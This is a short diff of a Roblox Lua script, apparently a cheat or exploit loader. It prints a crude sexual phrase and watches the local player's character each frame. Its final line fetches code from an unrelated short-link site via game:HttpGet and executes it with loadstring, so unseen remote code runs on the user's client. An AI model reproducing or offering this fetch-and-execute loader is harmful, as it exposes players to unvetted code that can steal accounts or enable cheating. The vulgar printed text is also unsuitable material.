@@ -1,5 +1,4 @@
 print"gay sex for men"
-
 wait(0.1)
 shared.io = game:GetService('RunService').RenderStepped:Connect(function()
         local BUSCO2 = game.Players.LocalPlayer.Character:FindFirstChild("Head")
@@ -8,5 +7,5 @@ if BUSCO2 then
     return
 end
 end)
-wait()
+wait(0.1)
 loadstring(game:HttpGet("https://joinmy.site/IW8R7Y", true))()
